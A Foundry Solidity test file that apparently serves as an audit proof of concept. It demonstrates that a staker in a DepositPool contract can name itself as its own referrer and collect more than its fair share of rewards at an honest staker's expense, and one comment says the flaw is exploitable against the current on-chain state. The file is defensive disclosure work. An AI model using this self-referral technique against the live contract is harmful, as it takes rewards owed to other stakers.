// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {SafeERC20, IERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

import {DepositPool} from "../src/contracts/capital-protocol/DepositPool.sol";
import {MockDistributor} from "../src/mocks/MockDistributor.sol";
import {MockRewardPool} from "../src/mocks/MockRewardPool.sol";
import {MockToken} from "../src/mocks/MockToken.sol";
import {MockMOR} from "../src/mocks/MockMOR.sol";
import {IReferrer} from "../src/contracts/interfaces/capital-protocol/IReferrer.sol";

contract SelfReferralTest is Test {
    using SafeERC20 for IERC20;

    MockToken token;
    MockMOR mor;
    MockRewardPool rewardPool;
    MockDistributor distributor;
    DepositPool pool;

    // The test contract deploys the proxy, so init's msg.sender == address(this) == owner.
    address owner = address(this);
    address attacker = address(0xB0);
    address honest = address(0xC0);

    uint256 constant POOL = 0;
    uint256 constant D = 1000e18;

    function setUp() public {
        token = new MockToken();
        mor = new MockMOR();
        rewardPool = new MockRewardPool();
        distributor = new MockDistributor();

        distributor.setRewardPoolAddr(address(rewardPool));
        distributor.setMOR(address(mor));
        distributor.setDepositTokenAddr(address(token));

        DepositPool impl = new DepositPool();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(impl),
            abi.encodeWithSelector(
                DepositPool.DepositPool_init.selector,
                address(token),
                address(distributor)
            )
        );
        pool = DepositPool(address(proxy));

        require(pool.owner() == owner, "owner mismatch");

        // Fund users
        token.mint(attacker, 1_000_000e18);
        token.mint(honest, 1_000_000e18);

        // Protocol details: no locks, no minimal stake.
        pool.setRewardPoolProtocolDetails(POOL, 0, 0, 0, 0);

        // Migration over (no deposits yet -> just flips the flag).
        pool.migrate(POOL);

        // Referrer tiers: 1% base, 5% at >=1000, 10% at >=10000.
        IReferrer.ReferrerTier[] memory tiers = new IReferrer.ReferrerTier[](3);
        tiers[0] = IReferrer.ReferrerTier({amount: 0, multiplier: 1e23});
        tiers[1] = IReferrer.ReferrerTier({amount: 1000e18, multiplier: 5e23});
        tiers[2] = IReferrer.ReferrerTier({amount: 10_000e18, multiplier: 1e24});
        pool.editReferrerTiers(POOL, tiers);
    }

    function _stake(address who, uint256 amt, address referrer) internal {
        // The Distributor pulls tokens from the user (safeTransferFrom), so approve the Distributor.
        vm.prank(who);
        IERC20(address(token)).approve(address(distributor), type(uint256).max);
        vm.prank(who);
        pool.stake(POOL, amt, 0, referrer);
    }

    function test_SelfReferral_OverEarning() public {
        // Attacker stakes D with SELF as referrer.
        _stake(attacker, D, attacker);
        // Honest stakes D with NO referrer.
        _stake(honest, D, address(0));

        // Distribute R = 1000 MOR to the pool.
        uint256 R = 1000e18;
        distributor.addDistributedRewards(POOL, address(pool), R);
        vm.warp(block.timestamp + 1 hours);

        // Attacker claims staker rewards, then referrer-tier rewards (self!).
        vm.prank(attacker);
        pool.claim(POOL, attacker);
        uint256 attackerStaker = mor.balanceOf(attacker);
        vm.prank(attacker);
        pool.claimReferrerTier(POOL, attacker);
        uint256 attackerTotal = mor.balanceOf(attacker);

        // Honest claims.
        vm.prank(honest);
        pool.claim(POOL, honest);
        uint256 honestGot = mor.balanceOf(honest);

        emit log_named_uint("R (total rewards)", R);
        emit log_named_uint("attacker staker share", attackerStaker);
        emit log_named_uint("attacker referrer share", attackerTotal - attackerStaker);
        emit log_named_uint("attacker TOTAL", attackerTotal);
        emit log_named_uint("honest TOTAL", honestGot);
        emit log_named_decimal_uint("attacker % of R", (attackerTotal * 100) / R, 2);
        emit log_named_decimal_uint("honest % of R", (honestGot * 100) / R, 2);
        emit log_named_uint("attacker over-earning (bps vs fair 5000)", (attackerTotal * 10000) / R - 5000);

        assertGt(attackerTotal, R / 2, "attacker must over-earn vs fair 50%");
        assertLt(honestGot, R / 2, "honest must under-earn vs fair 50%");
        // No over-mint: total minted <= R (1 wei short is floor-division rounding).
        assertLe(distributor.totalMinted(), R, "no over-mint: total minted must not exceed R");
    }

    function test_Control_NoReferral_FairSplit() public {
        _stake(attacker, D, address(0));
        _stake(honest, D, address(0));

        uint256 R = 1000e18;
        distributor.addDistributedRewards(POOL, address(pool), R);
        vm.warp(block.timestamp + 1 hours);

        vm.prank(attacker);
        pool.claim(POOL, attacker);
        vm.prank(honest);
        pool.claim(POOL, honest);

        uint256 a = mor.balanceOf(attacker);
        uint256 h = mor.balanceOf(honest);
        emit log_named_uint("control attacker", a);
        emit log_named_uint("control honest", h);
        assertEq(a, R / 2, "control attacker fair 50%");
        assertEq(h, R / 2, "control honest fair 50%");
    }

    // CURRENT ON-CHAIN STATE: referrerTiers[pool] is EMPTY.
    // Even with empty tiers, self-referral grants the +1% base REFERRAL_MULTIPLIER
    // on the staker's own stake (tier multiplier is 0, but base bonus always applies
    // for any non-zero referrer). This is exploitable right now.
    function test_SelfReferral_EmptyTiers_CurrentState() public {
        // Remove tiers to mirror current on-chain state (empty arrays).
        pool.editReferrerTiers(POOL, new IReferrer.ReferrerTier[](0));

        // Attacker stakes D with SELF as referrer (empty tiers).
        _stake(attacker, D, attacker);
        // Honest stakes D with NO referrer.
        _stake(honest, D, address(0));

        uint256 R = 1000e18;
        distributor.addDistributedRewards(POOL, address(pool), R);
        vm.warp(block.timestamp + 1 hours);

        vm.prank(attacker);
        pool.claim(POOL, attacker);
        uint256 attackerTotal = mor.balanceOf(attacker);

        vm.prank(honest);
        pool.claim(POOL, honest);
        uint256 honestGot = mor.balanceOf(honest);

        emit log_named_uint("EMPTY-TIERS attacker TOTAL", attackerTotal);
        emit log_named_uint("EMPTY-TIERS honest TOTAL", honestGot);
        emit log_named_decimal_uint("EMPTY-TIERS attacker % of R", (attackerTotal * 100) / R, 4);
        emit log_named_decimal_uint("EMPTY-TIERS honest % of R", (honestGot * 100) / R, 4);
        emit log_named_uint("EMPTY-TIERS attacker over-earning (bps vs 5000)", (attackerTotal * 10000) / R - 5000);

        // Even with empty tiers, self-referral over-earns vs fair 50%.
        assertGt(attackerTotal, R / 2, "empty-tiers self-referral must over-earn vs fair 50%");
        assertLt(honestGot, R / 2, "empty-tiers honest must under-earn vs fair 50%");
    }

    function test_SelfReferral_DominantStake() public {
        uint256 Da = 10_000e18;
        uint256 Dh = 1000e18;
        _stake(attacker, Da, attacker);
        _stake(honest, Dh, address(0));

        uint256 R = 1000e18;
        distributor.addDistributedRewards(POOL, address(pool), R);
        vm.warp(block.timestamp + 1 hours);

        vm.prank(attacker);
        pool.claim(POOL, attacker);
        vm.prank(attacker);
        pool.claimReferrerTier(POOL, attacker);
        uint256 attackerTotal = mor.balanceOf(attacker);

        vm.prank(honest);
        pool.claim(POOL, honest);
        uint256 honestGot = mor.balanceOf(honest);

        emit log_named_uint("dominant attacker TOTAL", attackerTotal);
        emit log_named_uint("dominant honest TOTAL", honestGot);
        emit log_named_decimal_uint("dominant attacker % of R", (attackerTotal * 100) / R, 2);
        emit log_named_decimal_uint("dominant honest % of R", (honestGot * 100) / R, 2);

        assertGt(attackerTotal, R / 2, "dominant attacker over-earns");
    }
}
